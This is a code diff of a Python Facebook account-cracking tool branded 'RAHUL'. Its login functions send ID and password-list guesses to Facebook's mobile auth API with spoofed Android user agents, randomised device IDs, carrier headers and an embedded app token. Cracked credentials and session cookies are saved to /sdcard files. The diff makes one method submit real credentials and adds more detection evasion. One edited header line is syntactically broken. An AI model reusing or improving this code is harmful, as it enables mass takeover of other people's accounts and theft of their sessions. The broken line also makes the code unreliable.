@@ -145,7 +145,6 @@ def remove_dub():
         main()
     except FileNotFoundError:
         print('\n\033[0;97m File not found on provided path, try again ...\033[0;97m')
-
         print('\n\033[0;97m File not found on provided path, try again ...\033[0;97m')
 def menu():
         try:
@@ -154,7 +153,7 @@ def menu():
         #       chk()
                 x = ("sex")
                 if x == ("sex"):
-                        print(' [1] File cloning Menu\n [2] File Create Menu\n [3] Random Cloning\n [4] Join Whatsapp Group\n [5] How to Use My Tools\n [0] Exit menu')
+                        print(' [1] File cloning Menu\n [2] File Create Menu\n [3] Random Cloning\n [4] Join Whatsapp Group\n [0] Exit menu')
                         linex()
                         xd=input(' Choose an option: ')
                         if xd in ['1','01']:
@@ -228,7 +227,7 @@ def menu():
                                                 if mthd in ['1','01']:
                                                         crack_submit.submit(ffb,ids,names,passlist)
                                                 elif mthd in ['2','02']:
-                                                        crack_submit.submit(crackmbasic,ids,names,passlist)
+                                                        crack_submit.submit(ffb3,ids,names,passlist)
                                                 elif mthd in ['3','03']:
                                                         crack_submit.submit(api3,ids,names,passlist)
                                                 elif mthd in ['4','04']:
@@ -271,8 +270,6 @@ def menu():
                         elif xd in ['4','04']:
                                wx=('Js1oU99b67uGRsaKs88RB7')
                                os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
-                        elif xd in ['5','05']:
-                               os.system(f'xdg-open https://www.youtube.com/@techrahul4794//{wx}');menu()        
                         elif xd in ['0','00']:
                                 exit(' Thanks for use 🥰 ')
                         else:
@@ -304,24 +301,20 @@ def ffb(ids,names,passlist):
                         Rahul=session.cookies.get_dict().keys()
                         if "c_user" in Rahul:
                                 coki=session.cookies.get_dict()
-                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
-                                open(f'/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                                print('\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 open('/sdcard/RB-COOKIES.txt', 'a').write(ids+'|'+kuki+'\n')
-                                #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Rahul:
-                                if 'Enter Login Code to Continue' in str(post_request):
-                                        print(f'\r\r\x1b[38;5;126m [RAHUL-2f] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/RAHUL-2f.txt', 'a').write(ids+'|'+pas+'\n')
-                                        tf.append(ids)
-                                        break        
-                        elif 'checkpoint' in Rahul:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open(f'/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;208m [RAHUL-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/RAHUL-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
+                                        break
+                                        
+                                else:
                                         break
                         else:
                                 continue
@@ -623,8 +616,8 @@ def api2(ids,names,passlist):
                                 ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
-                                data = {'adid':"9e0f3002-43fc-4358-89f1-5622b403d502",
-                                        'email':'10000'+str(random.randint(11111111111,99999999999)), 
+                                data = {'adid':adid,
+                                        'email':'10000'+str(random.randint(11111111111,99999999999)),
                                         'password':str(random.randint(1111111,9999999)),
                                         'cpl':'true',
                                         'credentials_type':'device_based_login_password',
@@ -642,7 +635,7 @@ def api2(ids,names,passlist):
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':'31061',
+                                        'x-fb-sim-hni':'x-fb-sim-hni': '31061',
                                         'x-fb-connection-type':'unknown',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua_string,
@@ -692,11 +685,11 @@ def api3(ids,names,passlist):
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
                                 ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-                                device_id = 'e66b2ae4-35b6-4c2b-822b-b57243edb930',
+                                device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
-                                        'email':'10000'+str(random.randint(11111111111,99999999999)),
-                                        'password':str(random.randint(1111111,9999999)),
+                                        'email':ids,
+                                        'password':pas,
                                         'cpl':'true',
                                         'credentials_type':'device_based_login_password',
                                         "source": "device_based_login",
@@ -707,18 +700,18 @@ def api3(ids,names,passlist):
                                         'generate_machine_id':'1',
                                         "locale":"es_CU","client_country_code":"CU",
                                         'device':gtt,
-                                        'device_id':'e66b2ae4-35b6-4c2b-822b-b57243edb930',
+                                        'device_id':adid,
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
                                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                 head = {
                                         'content-type':'application/x-www-form-urlencoded',
-                                        'x-fb-sim-hni':"31061",
-                                        'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA',
+                                        'x-fb-sim-hni':"45201",
+                                        'x-fb-connection-type':'mobile.LTE',
                                         'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                         'user-agent':ua_string,
-                                        'x-fb-net-hni':"28613",
-                                        'x-fb-connection-bandwidth':'29643048',
+                                        'x-fb-net-hni':"45204",
+                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                         'x-fb-connection-quality':'EXCELLENT',
                                         'x-fb-friendly-name':'authenticate',
                                         'accept-encoding':'gzip, deflate',
@@ -747,8 +740,7 @@ def api3(ids,names,passlist):
                 except requests.exceptions.ConnectionError:
                         time.sleep(10)
                 except Exception as e:
-                        pass 
-
+                        pass                        
 try:
         approval()
 except requests.exceptions.ConnectionError:
